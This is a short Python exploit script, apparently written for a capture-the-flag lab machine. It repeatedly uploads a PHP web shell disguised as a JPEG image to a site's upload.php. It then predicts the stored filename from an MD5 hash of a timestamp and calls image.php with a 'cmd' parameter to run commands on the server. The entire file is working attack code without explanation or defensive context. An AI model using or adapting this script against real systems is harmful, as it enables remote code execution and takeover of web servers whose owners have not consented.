import requests
import time
import hashlib
import requests

import requests

while True:

	burp0_url = "http://10.10.11.135:80/upload.php"
	burp0_cookies = {"PHPSESSID": "dcrftsjdcnfjjgk9svsbma1a7g"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary4Wechuvw6UvWnwdK", "Accept": "*/*", "Origin": "http://10.10.11.135", "Referer": "http://10.10.11.135/avatar_uploader.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
	burp0_data = "------WebKitFormBoundary4Wechuvw6UvWnwdK\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"a.jpg\"\r\nContent-Type: text/plain\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundary4Wechuvw6UvWnwdK--\r\n"
	proxies={"http":"http://127.0.0.1:8080"}
	requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies=proxies)

	
	s="$file_hash"+str(int(time.time()))
	print(s)
	name=hashlib.md5(s.encode()).hexdigest()+"_a.jpg"
	print(name)

	burp0_url = "http://10.10.11.135:80/image.php?img=images/uploads/"+name+"&cmd=whoami"
	burp0_cookies = {"PHPSESSID": "35qcp5a6k63732v1hoe7tp48kk"}
	burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://10.10.11.135", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://10.10.11.135/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
	proxies={"http":"http://127.0.0.1:8080"}
	r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,proxies=proxies)
	print(r.text)

	time.sleep(1)